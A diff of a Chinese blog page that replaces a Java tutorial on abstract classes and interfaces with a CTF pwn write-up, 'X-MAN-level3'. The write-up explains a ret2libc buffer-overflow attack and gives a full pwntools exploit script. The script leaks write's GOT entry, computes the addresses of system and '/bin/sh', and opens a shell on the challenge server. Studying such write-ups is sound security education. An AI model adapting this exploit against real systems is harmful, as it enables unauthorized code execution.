@@ -3,18 +3,18 @@
 <head>
   <meta charset="utf-8">
   
-  <title>java之抽象类与接口 | YungGong</title>
+  <title>X-MAN-level3 | YungGong</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="java之抽象类与接口(附加IDEA中debug快捷键)">
+  <meta name="description" content="X-MAN-level3">
 <meta property="og:type" content="article">
-<meta property="og:title" content="java之抽象类与接口">
-<meta property="og:url" content="http://yunnigu.dropsec.xyz/2016/09/25/java之抽象类与接口/index.html">
+<meta property="og:title" content="X-MAN-level3">
+<meta property="og:url" content="http://yunnigu.dropsec.xyz/2017/02/24/X-MAN-level3/index.html">
 <meta property="og:site_name" content="YungGong">
-<meta property="og:description" content="java之抽象类与接口(附加IDEA中debug快捷键)">
-<meta property="og:updated_time" content="2016-11-28T12:47:09.106Z">
+<meta property="og:description" content="X-MAN-level3">
+<meta property="og:updated_time" content="2017-02-24T09:23:15.809Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="java之抽象类与接口">
-<meta name="twitter:description" content="java之抽象类与接口(附加IDEA中debug快捷键)">
+<meta name="twitter:title" content="X-MAN-level3">
+<meta name="twitter:description" content="X-MAN-level3">
   
     <link rel="alternative" href="/atom.xml" title="YungGong" type="application/atom+xml">
   
@@ -225,11 +225,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-java之抽象类与接口" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-X-MAN-level3" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/09/25/java之抽象类与接口/" class="article-date">
-      <time datetime="2016-09-25T04:05:00.000Z" itemprop="datePublished">2016-09-25</time>
+      <a href="/2017/02/24/X-MAN-level3/" class="article-date">
+      <time datetime="2017-02-24T08:29:37.000Z" itemprop="datePublished">2017-02-24</time>
 </a>
     </div>
   
@@ -242,7 +242,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      java之抽象类与接口
+      X-MAN-level3
     </h1>
   
 
@@ -253,7 +253,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IDEA/">IDEA</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java，面向对象/">java，面向对象</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -263,166 +263,48 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="java之抽象类与接口-附加IDEA中debug快捷键"><a href="#java之抽象类与接口-附加IDEA中debug快捷键" class="headerlink" title="java之抽象类与接口(附加IDEA中debug快捷键)"></a>java之抽象类与接口(附加IDEA中debug快捷键)</h1><a id="more"></a>
-<h2 id="一、抽象类的定义及特点："><a href="#一、抽象类的定义及特点：" class="headerlink" title="一、抽象类的定义及特点："></a>一、抽象类的定义及特点：</h2><pre><code>1.方法只声明不实现，该方法就是抽象方法，需要abstract修饰，
-  抽象方法必须定义在抽象类中，该类必须被abstract修饰。
-2.抽象类不可以被实例化，不能new。因为方法内容不确定所以对象调用方法没意义。
-3.抽象类必须由子类覆盖了所有的方法后，该子类才可以实例化，否则这个子类还是抽象类。
-4.抽象类由构造函数用于给子类对象进行初始化。
-5.抽象类可以不定义抽象方法,目的是不让类创建对象，AWT的适配器类对象就
-  是这种类，是一个抽象类，但是却没有一个抽象方法，有的是非抽象方法，但是这些方法有方法体，却没有内容。
-6.抽象关键字不能和以下几类共存：
-  private：因为抽象方法必须要覆盖，一旦私有子类就不知道有这个方法，就不能实现覆盖。
-  static：类名即可调用，但是调用却没意义。
-  final：抽象方法必须覆盖，final不能被覆盖。
-7.抽象类和一般类的异同.
-  相同：都是用来描述事物，都在内部定义了成员。
-  不同：
-  一般类由足够的信息描述事物，一般类描述事物的信息不足。
-  一般类不能定义抽象方法，抽象类可以定义抽象方法和非抽象方法。
-  一般类可以被实例化，抽象类不能被实例化。
-8.抽象类一定是父类，因为需要子类覆盖方法。
-</code></pre><p>抽象类的定义格式</p>
-<pre><code>abstract class 抽象类名称{
-    属性；
-    访问权限 返回值类型 方法名称（参数）{        //普通方法
-        [return 返回值]；
-    }
-    访问权限abstract返回值类型 方法名称（参数）；  //抽象方法
-    //在抽象类方法中是没有具体方法的
-}
-</code></pre><h2 id="二、接口的定义与实现"><a href="#二、接口的定义与实现" class="headerlink" title="二、接口的定义与实现"></a>二、接口的定义与实现</h2><h3 id="定义接口："><a href="#定义接口：" class="headerlink" title="定义接口："></a>定义接口：</h3><p>使用interface来定义一个接口。接口定义同类的定义类似，也是分为接口的声明和接口体，其中接口体由常量定义和方法定义两部分组成。定义接口的基本格式如下：</p>
-<pre><code>　　[修饰符] interface 接口名 [extends 父接口名列表]{
-　　    [public] [static] [final] 常量;
-　　    [public] [abstract] 方法;
-　　}
-</code></pre><p>　　修饰符：可选，用于指定接口的访问权限，可选值为public。如果省略则使用默认的访问权限。</p>
-<p>　　接口名：必选参数，用于指定接口的名称，接口名必须是合法的Java标识符。一般情况下，要求首字母大写。</p>
-<p>　　extends 父接口名列表：可选参数，用于指定要定义的接口继承于哪个父接口。当使用extends关键字时，父接口名为必选参数。</p>
-<p>　　方法：接口中的方法只有定义而没有被实现。</p>
-<p>　　例如，定义一个用于计算的接口，在该接口中定义了一个常量PI和两个方法，具体代码如下：</p>
-<pre><code>　　public interface CalInterface
-　　{
-    　　final float PI=3.14159f;//定义用于表示圆周率的常量PI
-    　　float getArea(float r);//定义一个用于计算面积的方法getArea()
-    　　float getCircumference(float r);//定义一个用于计算周长的方法getCircumference()
-　　}
-</code></pre><p>　　注意：与Java的类文件一样，接口文件的文件名必须与接口名相同。</p>
-<h3 id="实现接口："><a href="#实现接口：" class="headerlink" title="实现接口："></a>实现接口：</h3><p>　　接口在定义后，就可以在类中实现该接口。在类中实现接口可以使用关键字implements，其基本格式如下：</p>
-<pre><code>　　[修饰符] class &lt;类名&gt; [extends &lt;父类名&gt;] [implements 接口列表] {
+        <h1 id="X-MAN-level3"><a href="#X-MAN-level3" class="headerlink" title="X-MAN-level3"></a>X-MAN-level3</h1><a id="more"></a>
+<p>本题主要考察通过延迟绑定技术泄漏函数的真实地址，<a href="http://yunnigu.dropsec.xyz/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">延迟绑定技术</a>,通过GDB调试会发现程序开启了NX保护。而且也找不到system函数和bin/sh，</p>
+<p>首先需要泄漏write函数的地址用来求出system和bin/sh的实际地址，构造payload=‘A’*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)<br>返回地址改为溢出发现的函数地址是为了接下来第二个payload的构造，因为函数每次运行的个函数的实际地址是不同的。后面的三个是write函数的三个参数，通过延迟绑定原理将write的实际地址写出来。</p>
+<p>第二个payload就是直接修改返回地址为system真实地址再加上bin/sh的地址就可以实现利用。脚本如下：</p>
+<pre><code>from pwn import *
 
-　　}
-</code></pre><p>　　修饰符：可选参数，用于指定类的访问权限，可选值为public、abstract和final。</p>
-<p>　　类名：必选参数，用于指定类的名称，类名必须是合法的Java标识符。一般情况下，要求首字母大写。</p>
-<p>　　extends 父类名：可选参数，用于指定要定义的类继承于哪个父类。当使用extends关键字时，父类名为必选参数。</p>
-<p>　　implements 接口列表：可选参数，用于指定该类实现的是哪些接口。当使用implements关键字时，接口列表为必选参数。当接口列表中存在多个接口名时，各个接口名之间使用逗号分隔。</p>
-<p>　　在类中实现接口时，方法的名字、返回值类型、参数的个数及类型必须与接口中的完全一致，并且必须实现接口中的所有方法。例如，编写一个名称为Cire的类，具体代码如下：</p>
-<pre><code>　　public class Cire implements CalInterface
-　　{
-    　　public float getArea(float r)
-        　　{
-            　　float area=PI*r*r;//计算圆面积并赋值给变量area
-            　　return area;//返回计算后的圆面积
-        　　}
-    　　public float getCircumference(float r)
-        　　{
-            　　float circumference=2*PI*r; //计算圆周长并赋值给变量circumference
-            　　return circumference; //返回计算后的圆周长
-        　　}
-    　　public static void main(String[] args)
-        　　{
-            　　Cire c = new Cire();
-            　　float f = c.getArea(2.0f);
-            　　System.out.println(Float.toString(f));
-        　　}
-　　}
-</code></pre><h2 id="三、抽象类和接口在继承中的语法特征"><a href="#三、抽象类和接口在继承中的语法特征" class="headerlink" title="三、抽象类和接口在继承中的语法特征"></a>三、抽象类和接口在继承中的语法特征</h2><p>由于从某种角度讲，接口是一种特殊的抽象类，它们的渊源颇深，有很大的相似之处，所以在选择使用谁的问题上很容易迷糊。我们首先分析它们具有的相同点。</p>
-<pre><code> 1.都代表类树形结构的抽象层。在使用引用变量时，尽量使用类结构的抽象层，使
-方法的定义和实现分离，这样做对于代码有松散耦合的好处。
- 2.都不能被实例化。
- 3.都能包含抽象方法。抽象方法用来描述系统提供哪些功能，而不必关心具体的实现。
- 4.抽象类可以为部分方法提供实现，避免了在子类中重复实现这些方法，提高了代
-码的可重用性，这是抽象类的优势；而接口中只能包含抽象方法，不能包含任何实现。
+#p=process(&apos;./level3&apos;)
+#libc=ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)
+#context.log_level = &apos;debug&apos;
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9879)
 
-public abstract class A{
-    public abstract void method1();
-    public void method2(){
-        //A method2
-    }
-}
-public class B extends A{
-    public void method1(){
-        //B method1
-    }
-}
-public class C extends A{
-    public void method1(){
-        //C method1
-    }
-}
-</code></pre><p>抽象类A有两个子类B、C，由于A中有方法method2的实现，子类B、C中不需要重写method2方法，我们就说A为子类提供了公共的功能，或A约束了子类的行为。method2就是代码可重用的例子。A 并没有定义 method1的实现，也就是说B、C 可以根据自己的特点实现method1方法，这又体现了松散耦合的特性。<br>再换成接口看看：</p>
-<pre><code>public interface A{
-    public void method1();
-    public void method2();
-}
-public class B implements A{
-    public void method1(){
-        //B method1
-    }
-    public void method2(){
-        //B method2
-    }
-}
-public class C implements A{
-    public void method1(){
-        //C method1
-    }
-    public void method2(){
-        //C method2
-    }
-}
-</code></pre><p>接口A无法为实现类B、C提供公共的功能，也就是说A无法约束B、C的行为。B、C可以自由地发挥自己的特点现实 method1和 method2方法，接口A毫无掌控能力。</p>
-<p>一个类只能继承一个直接的父类（可能是抽象类），但一个类可以实现多个接口，这个就是接口的优势。</p>
-<pre><code>interface A{
-    public void method2();
-}
-interface B{
-    public void method1();
-}
-class C implements A,B{
-    public void method1(){
-        //C method1
-    }
-    public void method2(){
-        //C method2
-    }
-}
-//可以如此灵活的使用C，并且C还有机会进行扩展，实现其他接口
-A a=new C();
-B b=new C();
-abstract class A{
-    public abstract void method1();
-}
-abstract class B extends A{
-    public abstract void method2();
-}
-class C extends B{
-    public void method1(){
-        //C method1
-    }
-    public void method2() {
-        //C method2
-    }
-</code></pre><h2 id="四、IDEA里debug快捷键"><a href="#四、IDEA里debug快捷键" class="headerlink" title="四、IDEA里debug快捷键"></a>四、IDEA里debug快捷键</h2><pre><code>F9            resume programe 恢复程序
-Alt+F10       show execution point 显示执行断点
-F8            Step Over 相当于eclipse的f6      跳到下一步
-F7            Step Into 相当于eclipse的f5就是  进入到代码
-Alt+shift+F7  Force Step Into 这个是强制进入代码
-Shift+F8      Step Out  相当于eclipse的f8跳到下一个断点，也相当于eclipse的f7跳出函数
-Atl+F9        Run To Cursor 运行到光标处
-ctrl+shift+F9   debug运行java类
-ctrl+shift+F10  正常运行java类
-alt+F8          debug时选中查看值
+level2=ELF(&apos;./level3&apos;)
+libc=ELF(&apos;libc-2.19.so&apos;)
+#offest
+writeoffest = libc.symbols[&apos;write&apos;]
+print writeoffest
+systemoffest = libc.symbols[&apos;system&apos;]
+print systemoffest
+binshoffest=0x0016084C
+#plt
+writeplt=0x08048340
+#got
+writegot=0x0804A018
+#addr
+basebss = 0x0804A024
+pop3ret = 0x08048519
+vuladdr = 0x0804844B
+
+payload=&apos;A&apos;*140+p32(writeplt) +p32(vuladdr)+ p32(1) + p32(writegot) + p32(4)
+
+p.recvuntil(&apos;Input:\n&apos;)
+p.send(payload)
+writeaddr=u32(p.recv(4))
+print writeaddr
+
+systemaddr = writeaddr - writeoffest + systemoffest
+binshaddr = writeaddr - writeoffest + binshoffest
+
+payload=&apos;a&apos;*140+p32(systemaddr)+p32(4)+p32(binshaddr)
+
+p.send(payload)
+p.interactive()
 </code></pre>
       
     </div>
@@ -431,13 +313,13 @@ alt+F8          debug时选中查看值
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/09/25/java之抽象类与接口/">java之抽象类与接口</a></p>
+        <p><span>本文标题:</span><a href="/2017/02/24/X-MAN-level3/">X-MAN-level3</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Yun 的个人博客">Yun</a></p>
-        <p><span>发布时间:</span>2016年09月25日 - 12时05分</p>
-        <p><span>最后更新:</span>2016年11月28日 - 20时47分</p>
+        <p><span>发布时间:</span>2017年02月24日 - 16时29分</p>
+        <p><span>最后更新:</span>2017年02月24日 - 17时23分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/09/25/java之抽象类与接口/" title="java之抽象类与接口">http://yunnigu.dropsec.xyz/2016/09/25/java之抽象类与接口/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yunnigu.dropsec.xyz/2016/09/25/java之抽象类与接口/　　作者: Yun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/02/24/X-MAN-level3/" title="X-MAN-level3">http://yunnigu.dropsec.xyz/2017/02/24/X-MAN-level3/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yunnigu.dropsec.xyz/2017/02/24/X-MAN-level3/　　作者: Yun" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -450,18 +332,9 @@ alt+F8          debug时选中查看值
 
 <nav id="article-nav">
   
-    <a href="/2016/09/25/30个java基础程序/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          30个java基础程序
-        
-      </div>
-    </a>
   
-  
-    <a href="/2016/09/25/基类子类对象间的替换/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">基类子类对象间的替换</div>
+    <a href="/2017/02/24/X-MAN-level0-level2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">X-MAN(level0~level2)</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -472,7 +345,7 @@ alt+F8          debug时选中查看值
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#java之抽象类与接口-附加IDEA中debug快捷键"><span class="toc-number">1.</span> <span class="toc-text">java之抽象类与接口(附加IDEA中debug快捷键)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、抽象类的定义及特点："><span class="toc-number">1.1.</span> <span class="toc-text">一、抽象类的定义及特点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、接口的定义与实现"><span class="toc-number">1.2.</span> <span class="toc-text">二、接口的定义与实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#定义接口："><span class="toc-number">1.2.1.</span> <span class="toc-text">定义接口：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实现接口："><span class="toc-number">1.2.2.</span> <span class="toc-text">实现接口：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、抽象类和接口在继承中的语法特征"><span class="toc-number">1.3.</span> <span class="toc-text">三、抽象类和接口在继承中的语法特征</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、IDEA里debug快捷键"><span class="toc-number">1.4.</span> <span class="toc-text">四、IDEA里debug快捷键</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#X-MAN-level3"><span class="toc-number">1.</span> <span class="toc-text">X-MAN-level3</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -520,7 +393,7 @@ alt+F8          debug时选中查看值
     
       <div class="duoshuo" id="comments">
     <!-- 多说评论框 start -->
-    <div class="ds-thread" data-thread-key="2016/09/25/java之抽象类与接口/" data-title="java之抽象类与接口" data-url="http://yunnigu.dropsec.xyz/2016/09/25/java之抽象类与接口/"></div>
+    <div class="ds-thread" data-thread-key="2017/02/24/X-MAN-level3/" data-title="X-MAN-level3" data-url="http://yunnigu.dropsec.xyz/2017/02/24/X-MAN-level3/"></div>
     <!-- 多说评论框 end -->
     <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
     <script type="text/javascript">
@@ -543,13 +416,11 @@ alt+F8          debug时选中查看值
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/09/25/30个java基础程序/" title="上一篇: 30个java基础程序">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2016/09/25/基类子类对象间的替换/" title="下一篇: 基类子类对象间的替换">
+            <a href="/2017/02/24/X-MAN-level0-level2/" title="下一篇: X-MAN(level0~level2)">
                 <i class="fa fa-angle-right"></i>
             </a>
         
